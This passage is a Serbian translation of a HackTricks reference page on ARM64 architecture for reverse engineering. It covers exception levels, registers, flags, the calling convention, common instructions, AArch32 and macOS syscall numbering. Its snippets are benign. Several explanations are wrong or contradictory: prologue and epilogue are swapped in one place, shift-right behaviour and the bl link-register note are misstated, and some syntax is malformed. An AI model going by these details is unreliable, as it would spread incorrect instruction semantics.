# Uvod u ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Nivoi Izuzetaka - EL (ARM64v8)**

U ARMv8 arhitekturi, nivoi izvršenja, poznati kao Nivoi Izuzetaka (EL), definišu nivo privilegije i mogućnosti izvršnog okruženja. Postoje četiri nivoa izuzetaka, od EL0 do EL3, svaki sa različitom svrhom:

1. **EL0 - Korisnički Mod**:
- Ovo je nivo sa najmanje privilegija i koristi se za izvršavanje redovnog aplikacionog koda.
- Aplikacije koje se izvršavaju na EL0 su izolovane jedna od druge i od sistemskog softvera, čime se poboljšava sigurnost i stabilnost.
2. **EL1 - Mod Jezgra Operativnog Sistema**:
- Većina jezgara operativnih sistema radi na ovom nivou.
- EL1 ima više privilegija od EL0 i može pristupiti sistemskim resursima, ali uz neka ograničenja kako bi se osigurala integritet sistema.
3. **EL2 - Mod Hipervizora**:
- Ovaj nivo se koristi za virtualizaciju. Hipervizor koji radi na EL2 može upravljati više operativnih sistema (svaki u svom EL1) koji rade na istom fizičkom hardveru.
- EL2 pruža funkcije za izolaciju i kontrolu virtualizovanih okruženja.
4. **EL3 - Mod Sigurnog Monitoringa**:
- Ovo je nivo sa najviše privilegija i često se koristi za sigurno pokretanje i poverljiva izvršna okruženja.
- EL3 može upravljati i kontrolisati pristupe između sigurnih i nesigurnih stanja (kao što su sigurno pokretanje, poverljivi OS, itd.).

Korišćenje ovih nivoa omogućava strukturiran i siguran način upravljanja različitim aspektima sistema, od korisničkih aplikacija do najprivilegovanijeg sistemskog softvera. Pristup ARMv8 nivoima privilegija pomaže u efikasnom izolovanju različitih komponenti sistema, čime se poboljšava sigurnost i otpornost sistema.

## **Registari (ARM64v8)**

ARM64 ima **31 opšti registar**, označen `x0` do `x30`. Svaki može da čuva **64-bitnu** (8-bajtnu) vrednost. Za operacije koje zahtevaju samo 32-bitne vrednosti, isti registri mogu biti dostupni u 32-bitnom režimu koristeći imena w0 do w30.

1. **`x0`** do **`x7`** - Ovi se obično koriste kao registri za privremene podatke i za prosleđivanje parametara podprogramima.
- **`x0`** takođe nosi povratne podatke funkcije.
2. **`x8`** - U Linux jezgru, `x8` se koristi kao broj sistemskog poziva za `svc` instrukciju. **U macOS se koristi x16!**
3. **`x9`** do **`x15`** - Više privremenih registara, često korišćenih za lokalne promenljive.
4. **`x16`** i **`x17`** - **Intra-proceduralni Registri Poziva**. Privremeni registri za neposredne vrednosti. Takođe se koriste za indirektne pozive funkcija i PLT (Tabela Povezivanja Procedura) stubove.
- **`x16`** se koristi kao **broj sistemskog poziva** za **`svc`** instrukciju u **macOS**.
5. **`x18`** - **Platformski registar**. Može se koristiti kao opšti registar, ali na nekim platformama je ovaj registar rezervisan za platformi-specifične upotrebe: Pokazivač na trenutni blok okruženja niti u Windows-u, ili za pokazivanje na trenutno **izvršavanje strukture zadatka u linux jezgru**.
6. **`x19`** do **`x28`** - Ovi su registri sačuvani od strane pozvane funkcije. Funkcija mora sačuvati vrednosti ovih registara za svog pozivaoca, tako da se čuvaju na steku i obnavljaju pre nego što se vrate pozivaocu.
7. **`x29`** - **Pokazivač okvira** za praćenje okvira steka. Kada se kreira novi okvir steka zbog poziva funkcije, **`x29`** registar se **čuva na steku** i **novi** pokazivač okvira adresa je (**`sp`** adresa) **čuva u ovom registru**.
- Ovaj registar se takođe može koristiti kao **opšti registar** iako se obično koristi kao referenca za **lokalne promenljive**.
8. **`x30`** ili **`lr`**- **Link registar**. Drži **povratnu adresu** kada se izvrši `BL` (Granica sa Linkom) ili `BLR` (Granica sa Linkom do Registra) instrukcija čuvajući **`pc`** vrednost u ovom registru.
- Takođe se može koristiti kao bilo koji drugi registar.
- Ako trenutna funkcija planira da pozove novu funkciju i time prepiše `lr`, čuvaće je na steku na početku, ovo je epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Čuvanje `fp` i `lr`, generisanje prostora i dobijanje novog `fp`) i obnavlja je na kraju, ovo je prolog (`ldp x29, x30, [sp], #48; ret` -> Obnavljanje `fp` i `lr` i povratak).
9. **`sp`** - **Pokazivač steka**, koristi se za praćenje vrha steka.
- **`sp`** vrednost treba uvek da bude održavana na najmanje **quadword** **poravnanje** ili može doći do izuzetka poravnanja.
10. **`pc`** - **Programski brojač**, koji pokazuje na sledeću instrukciju. Ovaj registar može se ažurirati samo kroz generisanje izuzetaka, povratke iz izuzetaka i granice. Jedine obične instrukcije koje mogu čitati ovaj registar su granice sa linkom (BL, BLR) da bi se sačuvala **`pc`** adresa u **`lr`** (Link Registar).
11. **`xzr`** - **Nulti registar**. Takođe se naziva **`wzr`** u njegovom **32**-bitnom obliku. Može se koristiti za lako dobijanje nulte vrednosti (obična operacija) ili za izvršavanje poređenja koristeći **`subs`** kao **`subs XZR, Xn, #10`** čuvajući rezultantne podatke nigde (u **`xzr`**).

**`Wn`** registri su **32bitna** verzija **`Xn`** registra.

### SIMD i Registari za Plutajuće Tačke

Pored toga, postoji još **32 registra dužine 128bit** koji se mogu koristiti u optimizovanim operacijama sa više podataka (SIMD) i za izvođenje aritmetike sa plutajućim tačkama. Ovi se nazivaju Vn registri iako mogu raditi i u **64**-bitnom, **32**-bitnom, **16**-bitnom i **8**-bitnom režimu, a tada se nazivaju **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### Sistemski Registri

**Postoje stotine sistemskih registara**, takođe poznatih kao registri specijalne namene (SPRs), koji se koriste za **praćenje** i **kontrolu** ponašanja **procesora**.\
Mogu se čitati ili postavljati samo korišćenjem posvećenih specijalnih instrukcija **`mrs`** i **`msr`**.

Specijalni registri **`TPIDR_EL0`** i **`TPIDDR_EL0`** se često nalaze prilikom inženjeringa obrnutih kodova. Sufiks `EL0` označava **minimalni izuzetak** sa kojeg se registar može pristupiti (u ovom slučaju EL0 je regularni izuzetak (privilegija) nivo na kojem redovni programi rade).\
Često se koriste za čuvanje **osnovne adrese regiona lokalne memorije**. Obično je prvi čitljiv i zapisiv za programe koji rade u EL0, ali se drugi može čitati iz EL0 i pisati iz EL1 (kao jezgro).

- `mrs x0, TPIDR_EL0 ; Čitaj TPIDR_EL0 u x0`
- `msr TPIDR_EL0, X0 ; Zapiši x0 u TPIDR_EL0`

### **PSTATE**

**PSTATE** sadrži nekoliko komponenti procesa serijalizovanih u operativnom sistemu vidljivom **`SPSR_ELx`** specijalnom registru, pri čemu je X **nivo dozvole** **izuzetka** koji je pokrenut (ovo omogućava obnavljanje stanja procesa kada izuzetak završi).\
Ovo su dostupna polja:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** i **`V`** uslovne zastavice:
- **`N`** znači da je operacija dala negativan rezultat
- **`Z`** znači da je operacija dala nulu
- **`C`** znači da je operacija nosila
- **`V`** znači da je operacija dala potpisano prelivanje:
- Zbir dva pozitivna broja daje negativan rezultat.
- Zbir dva negativna broja daje pozitivan rezultat.
- U oduzimanju, kada se veliki negativni broj oduzima od manjeg pozitivnog broja (ili obrnuto), i rezultat se ne može predstaviti unutar opsega date veličine bita.
- Očigledno, procesor ne zna da li je operacija potpisana ili ne, pa će proveriti C i V u operacijama i označiti da li je došlo do prenosa u slučaju da je bila potpisana ili nepodpisana.

> [!WARNING]
> Nisu sve instrukcije ažuriraju ove zastavice. Neke kao **`CMP`** ili **`TST`** to rade, a druge koje imaju s sufiks kao **`ADDS`** takođe to rade.

- Trenutna **širina registra (`nRW`) zastavica**: Ako zastavica drži vrednost 0, program će se izvršavati u AArch64 izvršnom stanju kada se ponovo pokrene.
- Trenutni **Nivo Izuzetka** (**`EL`**): Regularni program koji se izvršava u EL0 će imati vrednost 0.
- **Zastavica za pojedinačno korakanje** (**`SS`**): Koristi se od strane debagera za pojedinačno korakanje postavljanjem SS zastavice na 1 unutar **`SPSR_ELx`** kroz izuzetak. Program će izvršiti jedan korak i izazvati izuzetak pojedinačnog koraka.
- **Zastavica za nelegalno stanje izuzetka** (**`IL`**): Koristi se za označavanje kada privilegovani softver izvrši nevalidan prenos nivoa izuzetka, ova zastavica se postavlja na 1 i procesor pokreće izuzetak nelegalnog stanja.
- **`DAIF`** zastavice: Ove zastavice omogućavaju privilegovanom programu da selektivno maskira određene spoljašnje izuzetke.
- Ako je **`A`** 1, to znači da će biti pokrenuti **asinkroni aborti**. **`I`** konfiguriše odgovor na spoljne hardverske **Zahteve za Prekid** (IRQ). i F se odnosi na **Brze Zahteve za Prekid** (FIR).
- **Zastavice za izbor pokazivača steka** (**`SPS`**): Privilegovani programi koji se izvršavaju u EL1 i iznad mogu prebacivati između korišćenja svog pokazivača steka i korisničkog modela (npr. između `SP_EL1` i `EL0`). Ova promena se vrši pisanjem u **`SPSel`** specijalni registar. Ovo se ne može uraditi iz EL0.

## **Konvencija Poziva (ARM64v8)**

ARM64 konvencija poziva specificira da se **prvih osam parametara** funkciji prosleđuje u registrima **`x0` do `x7`**. **Dodatni** parametri se prosleđuju na **steku**. **Povratna** vrednost se vraća u registru **`x0`**, ili u **`x1`** takođe **ako je dugačka 128 bita**. Registri **`x19`** do **`x30`** i **`sp`** moraju biti **sačuvani** tokom poziva funkcija.

Kada čitate funkciju u asembleru, tražite **prolog i epilog funkcije**. **Prolog** obično uključuje **čuvanje pokazivača okvira (`x29`)**, **postavljanje** novog **pokazivača okvira**, i **alokaciju prostora na steku**. **Epilog** obično uključuje **obnavljanje sačuvanog pokazivača okvira** i **povratak** iz funkcije.

### Konvencija Poziva u Swift-u

Swift ima svoju **konvenciju poziva** koja se može naći u [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Uobičajene Instrukcije (ARM64v8)**

ARM64 instrukcije obično imaju **format `opcode dst, src1, src2`**, gde je **`opcode`** **operacija** koja treba da se izvrši (kao što su `add`, `sub`, `mov`, itd.), **`dst`** je **odredišni** registar gde će rezultat biti sačuvan, a **`src1`** i **`src2`** su **izvorni** registri. Neposredne vrednosti se takođe mogu koristiti umesto izvora registara.

- **`mov`**: **Premesti** vrednost iz jednog **registra** u drugi.
- Primer: `mov x0, x1` — Ovo premesti vrednost iz `x1` u `x0`.
- **`ldr`**: **Učitaj** vrednost iz **memorije** u **registar**.
- Primer: `ldr x0, [x1]` — Ovo učitava vrednost iz memorijske lokacije na koju pokazuje `x1` u `x0`.
- **Offset mod**: Offset koji utiče na izvorni pokazivač je naznačen, na primer:
- `ldr x2, [x1, #8]`, ovo će učitati u x2 vrednost iz x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, ovo će učitati u x2 objekat iz niza x0, sa pozicije x1 (indeks) \* 4
- **Pre-indeksirani mod**: Ovo će primeniti proračune na izvor, dobiti rezultat i takođe sačuvati novi izvor u izvoru.
- `ldr x2, [x1, #8]!`, ovo će učitati `x1 + 8` u `x2` i sačuvati u x1 rezultat `x1 + 8`
- `str lr, [sp, #-4]!`, Sačuvaj link registar u sp i ažuriraj registar sp
- **Post-indeks mod**: Ovo je kao prethodni, ali se memorijska adresa pristupa i zatim se izračunava i čuva offset.
- `ldr x0, [x1], #8`, učitaj `x1` u `x0` i ažuriraj x1 sa `x1 + 8`
- **PC-relativno adresiranje**: U ovom slučaju, adresa za učitavanje se izračunava u odnosu na PC registar
- `ldr x1, =_start`, Ovo će učitati adresu gde simbol `_start` počinje u x1 u odnosu na trenutni PC.
- **`str`**: **Sačuvaj** vrednost iz **registra** u **memoriju**.
- Primer: `str x0, [x1]` — Ovo čuva vrednost u `x0` u memorijskoj lokaciji na koju pokazuje `x1`.
- **`ldp`**: **Učitaj par registara**. Ova instrukcija **učitava dva registra** iz **uzastopnih memorijskih** lokacija. Memorijska adresa se obično formira dodavanjem offseta vrednosti u drugom registru.
- Primer: `ldp x0, x1, [x2]` — Ovo učitava `x0` i `x1` iz memorijskih lokacija na `x2` i `x2 + 8`, respektivno.
- **`stp`**: **Sačuvaj par registara**. Ova instrukcija **čuva dva registra** u **uzastopne memorijske** lokacije. Memorijska adresa se obično formira dodavanjem offseta vrednosti u drugom registru.
- Primer: `stp x0, x1, [sp]` — Ovo čuva `x0` i `x1` u memorijske lokacije na `sp` i `sp + 8`, respektivno.
- `stp x0, x1, [sp, #16]!` — Ovo čuva `x0` i `x1` u memorijske lokacije na `sp+16` i `sp + 24`, respektivno, i ažurira `sp` sa `sp+16`.
- **`add`**: **Dodaj** vrednosti dva registra i sačuvaj rezultat u registru.
- Sintaksa: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Odredište
- Xn2 -> Operanda 1
- Xn3 | #imm -> Operando 2 (registar ili neposredna vrednost)
- \[shift #N | RRX] -> Izvrši pomeranje ili pozovi RRX
- Primer: `add x0, x1, x2` — Ovo dodaje vrednosti u `x1` i `x2` zajedno i čuva rezultat u `x0`.
- `add x5, x5, #1, lsl #12` — Ovo je jednako 4096 (1 pomerano 12 puta) -> 1 0000 0000 0000 0000
- **`adds`** Ovo izvršava `add` i ažurira zastavice
- **`sub`**: **Oduzmi** vrednosti dva registra i sačuvaj rezultat u registru.
- Proveri **`add`** **sintaksu**.
- Primer: `sub x0, x1, x2` — Ovo oduzima vrednost u `x2` od `x1` i čuva rezultat u `x0`.
- **`subs`** Ovo je kao sub ali ažurira zastavicu
- **`mul`**: **Pomnoži** vrednosti **dva registra** i sačuvaj rezultat u registru.
- Primer: `mul x0, x1, x2` — Ovo množi vrednosti u `x1` i `x2` i čuva rezultat u `x0`.
- **`div`**: **Podeli** vrednost jednog registra sa drugim i sačuvaj rezultat u registru.
- Primer: `div x0, x1, x2` — Ovo deli vrednost u `x1` sa `x2` i čuva rezultat u `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logičko pomeranje levo**: Dodaje 0s sa kraja pomerajući druge bitove napred (množi sa n puta 2)
- **Logičko pomeranje desno**: Dodaje 1s na početku pomerajući druge bitove unazad (deli sa n puta 2 u nepodpisanom)
- **Aritmetičko pomeranje desno**: Kao **`lsr`**, ali umesto dodavanja 0s, ako je najznačajniji bit 1, dodaju se **1s** (deli sa n puta 2 u potpisanom)
- **Rotacija desno**: Kao **`lsr`** ali šta god da se ukloni sa desne strane se dodaje levo
- **Rotacija desno sa proširenjem**: Kao **`ror`**, ali sa zastavicom prenosa kao "najznačajnijim bitom". Tako se zastavica prenosa pomera na bit 31, a uklonjeni bit na zastavicu prenosa.
- **`bfm`**: **Pomeranje Bit Polja**, ove operacije **kopiraju bitove `0...n`** iz vrednosti i postavljaju ih u pozicije **`m..m+n`**. **`#s`** označava **najlevo bit** poziciju, a **`#r`** količinu rotacije desno.
- Pomeranje bit polja: `BFM Xd, Xn, #r`
- Potpisano pomeranje bit polja: `SBFM Xd, Xn, #r, #s`
- Nepotpisano pomeranje bit polja: `UBFM Xd, Xn, #r, #s`
- **Ekstrakt i Umetanje Bit Polja:** Kopira bit polje iz registra i kopira ga u drugi registar.
- **`BFI X1, X2, #3, #4`** Umetni 4 bita iz X2 sa 3. bita X1
- **`BFXIL X1, X2, #3, #4`** Ekstrahuje iz 3. bita X2 četiri bita i kopira ih u X1
- **`SBFIZ X1, X2, #3, #4`** Proširuje potpis 4 bita iz X2 i umetne ih u X1 počinjući na bit poziciji 3, postavljajući desne bitove na nulu
- **`SBFX X1, X2, #3, #4`** Ekstrahuje 4 bita počinjući na bitu 3 iz X2, proširuje ih potpisom i postavlja rezultat u X1
- **`UBFIZ X1, X2, #3, #4`** Proširuje 4 bita iz X2 i umetne ih u X1 počinjući na bit poziciji 3, postavljajući desne bitove na nulu
- **`UBFX X1, X2, #3, #4`** Ekstrahuje 4 bita počinjući na bitu 3 iz X2 i postavlja rezultat proširen sa nulom u X1.
- **Proširenje Potpisa na X:** Proširuje potpis (ili dodaje samo 0s u nepodpisanoj verziji) vrednosti da bi mogla da se izvrše operacije sa njom:
- **`SXTB X1, W2`** Proširuje potpis bajta **iz W2 u X1** (`W2` je polovina `X2`) da popuni 64bita
- **`SXTH X1, W2`** Proširuje potpis 16-bitnog broja **iz W2 u X1** da popuni 64bita
- **`SXTW X1, W2`** Proširuje potpis bajta **iz W2 u X1** da popuni 64bita
- **`UXTB X1, W2`** Dodaje 0s (nepotpisano) bajtu **iz W2 u X1** da popuni 64bita
- **`extr`:** Ekstrahuje bitove iz određenog **para registara koji su spojeni**.
- Primer: `EXTR W3, W2, W1, #3` Ovo će **spojiti W1+W2** i uzeti **od bita 3 W2 do bita 3 W1** i sačuvati u W3.
- **`cmp`**: **Uporedi** dva registra i postavi uslovne zastavice. To je **alias `subs`** postavljajući odredišni registar na nulti registar. Korisno za proveru da li je `m == n`.
- Podržava **istu sintaksu kao `subs`**
- Primer: `cmp x0, x1` — Ovo upoređuje vrednosti u `x0` i `x1` i postavlja uslovne zastavice u skladu s tim.
- **`cmn`**: **Uporedi negativni** operand. U ovom slučaju je to **alias `adds`** i podržava istu sintaksu. Korisno za proveru da li je `m == -n`.
- **`ccmp`**: Uslovno poređenje, to je poređenje koje će se izvršiti samo ako je prethodno poređenje bilo tačno i posebno će postaviti nzcv bitove.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ako x1 != x2 i x3 < x4, skoči na func
- Ovo je zato što će **`ccmp`** biti izvršen samo ako je **prethodni `cmp` bio `NE`**, ako nije, bitovi `nzcv` će biti postavljeni na 0 (što neće zadovoljiti `blt` poređenje).
- Ovo se takođe može koristiti kao `ccmn` (isto ali negativno, kao `cmp` vs `cmn`).
- **`tst`**: Proverava da li su bilo koje od vrednosti poređenja oba 1 (radi kao ANDS bez čuvanja rezultata bilo gde). Korisno je proveriti registar sa vrednošću i proveriti da li je bilo koji od bitova registra označenih u vrednosti 1.
- Primer: `tst X1, #7` Proveri da li je bilo koji od poslednja 3 bita X1 1
- **`teq`**: XOR operacija odbacujući rezultat
- **`b`**: Bezuslovna Granica
- Primer: `b myFunction`
- Napomena da ovo neće popuniti link registar sa povratnom adresom (nije pogodno za pozive podprograma koji treba da se vrate nazad)
- **`bl`**: **Granica** sa linkom, koristi se za **pozivanje** **podprograma**. Čuva **povratnu adresu u `x30`**.
- Primer: `bl myFunction` — Ovo poziva funkciju `myFunction` i čuva povratnu adresu u `x30`.
- Napomena da ovo neće popuniti link registar sa povratnom adresom (nije pogodno za pozive podprograma koji treba da se vrate nazad)
- **`blr`**: **Granica** sa Linkom do Registra, koristi se za **pozivanje** **podprograma** gde je cilj **naznačen** u **registru**. Čuva povratnu adresu u `x30`. (Ovo je
- Primer: `blr x1` — Ovo poziva funkciju čija je adresa sadržana u `x1` i čuva povratnu adresu u `x30`.
- **`ret`**: **Povratak** iz **podprograma**, obično koristeći adresu u **`x30`**.
- Primer: `ret` — Ovo se vraća iz trenutnog podprograma koristeći povratnu adresu u `x30`.
- **`b.<cond>`**: Uslovne granice
- **`b.eq`**: **Granica ako je jednako**, na osnovu prethodne `cmp` instrukcije.
- Primer: `b.eq label` — Ako je prethodna `cmp` instrukcija našla dve jednake vrednosti, ovo skače na `label`.
- **`b.ne`**: **Granica ako nije jednako**. Ova instrukcija proverava uslovne zastavice (koje su postavljene prethodnom instrukcijom poređenja), i ako upoređene vrednosti nisu jednake, granica se postavlja na oznaku ili adresu.
- Primer: Nakon `cmp x0, x1` instrukcije, `b.ne label` — Ako vrednosti u `x0` i `x1 nisu jednake, ovo skače na `label`.
- **`cbz`**: **Uporedi i Granica na Nulu**. Ova instrukcija upoređuje registar sa nulom, i ako su jednake, granica se postavlja na oznaku ili adresu.
- Primer: `cbz x0, label` — Ako je vrednost u `x0` nula, ovo skače na `label`.
- **`cbnz`**: **Uporedi i Granica na Nenu**. Ova instrukcija upoređuje registar sa nulom, i ako nisu jednake, granica se postavlja na oznaku ili adresu.
- Primer: `cbnz x0, label` — Ako je vrednost u `x0` nenula, ovo skače na `label`.
- **`tbnz`**: Testiraj bit i granica na nenulu
- Primer: `tbnz x0, #8, label`
- **`tbz`**: Testiraj bit i granica na nulu
- Primer: `tbz x0, #8, label`
- **Uslovne operacije selekcije**: Ovo su operacije čije se ponašanje menja u zavisnosti od uslovnih bitova.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ako je tačno, X0 = X1, ako nije, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ako je tačno, Xd = Xn + 1, ako nije, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ako je tačno, Xd = NOT(Xn), ako nije, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ako je tačno, Xd = - Xn, ako nije, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ako je tačno, Xd = 1, ako nije, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ako je tačno, Xd = \<svi 1>, ako nije, Xd = 0
- **`adrp`**: Izračunaj **adresu stranice simbola** i sačuvaj je u registru.
- Primer: `adrp x0, symbol` — Ovo izračunava adresu stranice simbola `symbol` i čuva je u `x0`.
- **`ldrsw`**: **Učitaj** potpisanu **32-bitnu** vrednost iz memorije i **proširi je na 64** bita.
- Primer: `ldrsw x0, [x1]` — Ovo učitava potpisanu 32-bitnu vrednost iz memorijske lokacije na koju pokazuje `x1`, proširuje je na 64 bita i čuva u `x0`.
- **`stur`**: **Sačuvaj vrednost registra na memorijsku lokaciju**, koristeći offset iz drugog registra.
- Primer: `stur x0, [x1, #4]` — Ovo čuva vrednost u `x0` u memorijskoj adresi koja je 4 bajta veća od adrese koja se trenutno nalazi u `x1`.
- **`svc`** : Napravi **sistemski poziv**. To znači "Poziv Supervizora". Kada procesor izvrši ovu instrukciju, **prebacuje se iz korisničkog moda u kernel mod** i skače na određenu lokaciju u memoriji gde se nalazi **kod za obradu sistemskih poziva jezgra**.

- Primer:

```armasm
mov x8, 93  ; Učitaj broj sistemskog poziva za izlaz (93) u registar x8.
mov x0, 0   ; Učitaj kod statusa izlaza (0) u registar x0.
svc 0       ; Napravi sistemski poziv.
```

### **Prolog Funkcije**

1. **Sačuvaj link registar i pokazivač okvira na steku**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Postavite novi pokazivač okvira**: `mov x29, sp` (postavlja novi pokazivač okvira za trenutnu funkciju)  
3. **Dodelite prostor na steku za lokalne promenljive** (ako je potrebno): `sub sp, sp, <size>` (gde je `<size>` broj bajtova koji su potrebni)  

### **Epilog funkcije**

1. **Dealokacija lokalnih promenljivih (ako su dodeljene)**: `add sp, sp, <size>`  
2. **Obnovite registrator veze i pokazivač okvira**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (vraća kontrolu pozivaocu koristeći adresu u link registru)

## AARCH32 Izvršni Stanje

Armv8-A podržava izvršavanje 32-bitnih programa. **AArch32** može raditi u jednom od **dva skupa instrukcija**: **`A32`** i **`T32`** i može prebacivati između njih putem **`interworking`**.\
**Privilegovani** 64-bitni programi mogu zakazati **izvršavanje 32-bitnih** programa izvršavanjem prenosa nivoa izuzetka na niže privilegovane 32-bitne.\
Napomena: prelazak sa 64-bitnog na 32-bitni se dešava sa smanjenjem nivoa izuzetka (na primer, 64-bitni program u EL1 pokreće program u EL0). Ovo se postiže postavljanjem **bita 4** **`SPSR_ELx`** specijalnog registra **na 1** kada je `AArch32` procesni nit spreman za izvršavanje, a ostatak `SPSR_ELx` čuva **`AArch32`** programe CPSR. Zatim, privilegovani proces poziva **`ERET`** instrukciju tako da procesor prelazi na **`AArch32`** ulazeći u A32 ili T32 u zavisnosti od CPSR\*\*.\*\*

**`Interworking`** se dešava korišćenjem J i T bitova CPSR. `J=0` i `T=0` znači **`A32`** i `J=0` i `T=1` znači **T32**. Ovo se u suštini prevodi na postavljanje **najnižeg bita na 1** da označi da je skup instrukcija T32.\
Ovo se postavlja tokom **interworking grana instrukcija,** ali se takođe može postaviti direktno sa drugim instrukcijama kada je PC postavljen kao registar odredišta. Primer:

Još jedan primer:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registar

Postoji 16 32-bitnih registara (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, međutim neki od njih su obično rezervisani:

- **`r15`**: Program counter (uvek). Sadrži adresu sledeće instrukcije. U A32 trenutni + 8, u T32, trenutni + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer
- **`r14`**: Link Register

Pored toga, registri se čuvaju u **`banked registries`**. To su mesta koja čuvaju vrednosti registara omogućavajući **brzo prebacivanje konteksta** u obradi izuzetaka i privilegovanih operacija kako bi se izbegla potreba za ručnim čuvanjem i obnavljanjem registara svaki put.\
To se postiže **čuvanjem stanja procesora iz `CPSR` u `SPSR`** režima procesora u kojem se izuzetak dešava. Kada se izuzetak vrati, **`CPSR`** se obnavlja iz **`SPSR`**.

### CPSR - Registar trenutnog statusa programa

U AArch32 CPSR funkcioniše slično **`PSTATE`** u AArch64 i takođe se čuva u **`SPSR_ELx`** kada se izuzetak dešava da bi se kasnije obnovila izvršavanje:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u nekoliko grupa:

- Registar statusa aplikacionog programa (APSR): Aritmetičke zastavice i dostupne iz EL0
- Registar stanja izvršavanja: Ponašanje procesa (upravlja OS).

#### Registar statusa aplikacionog programa (APSR)

- Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (poput AArch64)
- Zastavica **`Q`**: Postavlja se na 1 kada **dođe do saturacije celih brojeva** tokom izvršavanja specijalizovane aritmetičke instrukcije. Kada se postavi na **`1`**, zadržaće tu vrednost dok se ručno ne postavi na 0. Pored toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost, to se mora uraditi čitanjem ručno.
- Zastavice **`GE`** (Veće ili jednako): Koriste se u SIMD (Jedna instrukcija, više podataka) operacijama, kao što su "paralelno sabiranje" i "paralelno oduzimanje". Ove operacije omogućavaju obradu više tačaka podataka u jednoj instrukciji.

Na primer, instrukcija **`UADD8`** **sabira četiri para bajtova** (iz dva 32-bitna operanda) paralelno i čuva rezultate u 32-bitnom registru. Zatim **postavlja `GE` zastavice u `APSR`** na osnovu ovih rezultata. Svaka GE zastavica odgovara jednom od sabiranja bajtova, ukazujući da li je sabiranje za taj par bajtova **prelilo**.

Instrukcija **`SEL`** koristi ove GE zastavice za izvođenje uslovnih akcija.

#### Registri stanja izvršavanja

- Bitovi **`J`** i **`T`**: **`J`** treba da bude 0, a ako je **`T`** 0 koristi se skup instrukcija A32, a ako je 1, koristi se T32.
- **IT Block State Register** (`ITSTATE`): Ovo su bitovi od 10-15 i 25-26. Čuvaju uslove za instrukcije unutar grupe sa prefiksom **`IT`**.
- Bit **`E`**: Ukazuje na **endianness**.
- Bitovi za režim i masku izuzetka (0-4): Određuju trenutno stanje izvršavanja. **5.** označava da li program radi kao 32bit (1) ili 64bit (0). Ostala 4 predstavljaju **režim izuzetka koji se trenutno koristi** (kada se desi izuzetak i obrađuje se). Broj postavljen **ukazuje na trenutni prioritet** u slučaju da se drugi izuzetak pokrene dok se ovaj obrađuje.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Određeni izuzeci mogu biti onemogućeni korišćenjem bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znači da će **asinkroni aborti** biti pokrenuti. **`I`** konfiguriše odgovor na spoljne hardverske **Interrupts Requests** (IRQs). a F se odnosi na **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls će imati **x16 > 0**.

### Mach Traps

Pogledajte u [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` i u [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototipove. Maksimalan broj Mach traps je `MACH_TRAP_TABLE_COUNT` = 128. Mach traps će imati **x16 < 0**, tako da treba da pozovete brojeve iz prethodne liste sa **minusom**: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takođe možete proveriti **`libsystem_kernel.dylib`** u disassembleru da biste saznali kako da pozovete ove (i BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Napomena da **Ida** i **Ghidra** takođe mogu dekompilirati **specifične dylibs** iz keša jednostavno prolazeći kroz keš.

> [!TIP]
> Ponekad je lakše proveriti **dekompilirani** kod iz **`libsystem_kernel.dylib`** **nego** proveravati **izvorni kod** jer se kod nekoliko syscalls (BSD i Mach) generiše putem skripti (proverite komentare u izvoru) dok u dylib-u možete pronaći šta se poziva.

### machdep pozivi

XNU podržava još jedan tip poziva koji se naziva zavistan od mašine. Broj ovih poziva zavisi od arhitekture i ni pozivi ni brojevi nisu garantovani da ostanu konstantni.

### comm stranica

